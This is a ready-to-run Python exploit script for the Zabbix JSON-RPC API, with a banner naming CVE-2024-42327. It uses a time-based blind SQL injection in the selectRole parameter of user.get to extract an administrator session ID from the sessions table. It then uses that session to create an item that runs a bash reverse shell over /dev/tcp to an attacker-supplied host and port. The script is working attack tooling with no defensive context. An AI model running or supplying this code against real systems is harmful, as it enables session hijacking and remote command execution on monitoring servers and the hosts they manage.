#!/usr/bin/python3

import requests
import json
from datetime import datetime
import string
import sys
from concurrent.futures import ThreadPoolExecutor

EXPECTED_RESPONSE_TIME = 1
ROW_INDEX = 0

def authenticate(api_url, username, password):
    """Authenticate the user and retrieve the authentication token."""
    payload = {
        "jsonrpc": "2.0",
        "method": "user.login",
        "params": {
            "username": username,
            "password": password
        },
        "id": 1
    }
    response = requests.post(api_url, json=payload)
    if response.status_code == 200:
        try:
            response_json = response.json()
            auth_token = response_json.get("result")
            if auth_token:
                print(f"Login successful! Auth token: {auth_token}")
                return auth_token
            else:
                print(f"Login failed. Response: {response_json}")
        except Exception as e:
            print(f"Error parsing response: {str(e)}")
    else:
        print(f"HTTP request failed with status code {response.status_code}")
    return None

def send_injection(api_url, auth_token, position, char):
    """Send an SQL injection payload and measure the response time."""
    payload = {
        "jsonrpc": "2.0",
        "method": "user.get",
        "params": {
            "output": ["userid", "username"],
            "selectRole": [
                "roleid",
                f"name AND (SELECT * FROM (SELECT(SLEEP({EXPECTED_RESPONSE_TIME} - "
                f"(IF(ORD(MID((SELECT sessionid FROM zabbix.sessions "
                f"WHERE userid=1 and status=0 LIMIT {ROW_INDEX},1), "
                f"{position}, 1))={ord(char)}, 0, {EXPECTED_RESPONSE_TIME})))))BEEF)"
            ],
            "editable": 1,
        },
        "auth": auth_token,
        "id": 1
    }
    start_time = datetime.now().timestamp()
    response = requests.post(api_url, json=payload)
    end_time = datetime.now().timestamp()
    response_time = end_time - start_time
    return char, response_time

def test_characters_parallel(api_url, auth_token, position):
    """Test all printable characters in parallel for a specific position."""
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(send_injection, api_url, auth_token, position, char): char
            for char in string.printable
        }
        for future in futures:
            char, response_time = future.result()
            if EXPECTED_RESPONSE_TIME - 0.5 < response_time < EXPECTED_RESPONSE_TIME + 0.5:
                return char
    return None

def print_progress(extracted_value):
    """Print the extraction progress."""
    sys.stdout.write(f"\rExtracting admin session: {extracted_value}")
    sys.stdout.flush()

def extract_admin_session_parallel(api_url, auth_token):
    """Extract the admin session ID by testing characters in parallel."""
    extracted_value = ""
    max_length = 32
    for position in range(1, max_length + 1):
        char = test_characters_parallel(api_url, auth_token, position)
        if char:
            extracted_value += char
            print_progress(extracted_value)
        else:
            print(f"\n(-) No character found at position {position}, stopping.")
            break
    return extracted_value

def get_host_ids(api_url, admin_session):
    """Retrieve current host IDs and their associated interface IDs."""
    payload = {
        "jsonrpc": "2.0",
        "method": "host.get",
        "params": {
            "output": ["hostid", "host"],
            "selectInterfaces": ["interfaceid"]
        },
        "auth": admin_session,
        "id": 1
    }
    response = requests.post(api_url, json=payload)
    if response.status_code == 200:
        try:
            response_json = response.json()
            print(f"host.get response: {response_json}")
            result = response_json.get("result", [])
            if result:
                host_id = result[0]["hostid"]
                interface_id = result[0]["interfaces"][0]["interfaceid"]
                return host_id, interface_id
            else:
                print("No hosts found in the response.")
                return None, None
        except Exception as e:
            print(f"Error parsing response: {str(e)}")
            return None, None
    else:
        print(f"Failed to retrieve host IDs. HTTP status code: {response.status_code}")
        return None, None

def send_reverse_shell_request(api_url, admin_session, lhost, lport, host_id, interface_id):
    """Send the reverse shell request to the target server."""
    payload = {
        "jsonrpc": "2.0",
        "method": "item.create",
        "params": {
            "name": "rce",
            "key_": f"system.run[bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"]",
            "delay": 1,
            "hostid": host_id,
            "type": 0,
            "value_type": 1,
            "interfaceid": interface_id
        },
        "auth": admin_session,
        "id": 1
    }
    response = requests.post(api_url, json=payload)
    if response.status_code == 200:
        print("Reverse shell command executed successfully.")
    else:
        print(f"Failed to send reverse shell request. HTTP status code: {response.status_code}")

if __name__ == "__main__":
    banner = r"""
        _______    ________    ___   ____ ___  __ __        __ __ ___  ________  _____
       / ____/ |  / / ____/   |__ \ / __ \__ \/ // /       / // /|__ \|__  /__ \/__  /
      / /    | | / / __/________/ // / / /_/ / // /_______/ // /___/ / /_ <__/ /  / / 
     / /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/__  __/ __/___/ / __/  / /  
     \____/  |___/_____/    /____/\____/____/ /_/          /_/ /____/____/____/ /_/   
    """
    print(banner) 

    api_url = input("API URL: ")
    username = input("username: ")
    password = input("password: ")
    lhost = input("lhost (local ip address for reverse shell): ")
    lport = input("lport (port number for reverse shell): ")

    print("Authenticating...")
    auth_token = authenticate(api_url, username, password)
    if auth_token:
        print("Starting data extraction...")
        admin_session = extract_admin_session_parallel(api_url, auth_token)
        print(f"\nAdmin session extracted: {admin_session}")
        
        host_id, interface_id = get_host_ids(api_url, admin_session)  # Admin session kullanıyoruz
        if host_id and interface_id:
            send_reverse_shell_request(api_url, admin_session, lhost, lport, host_id, interface_id)  # Admin session kullanıyoruz
        else:
            print("Failed to retrieve host or interface ID.")
    else:
        print("Authentication failed. Exiting.")
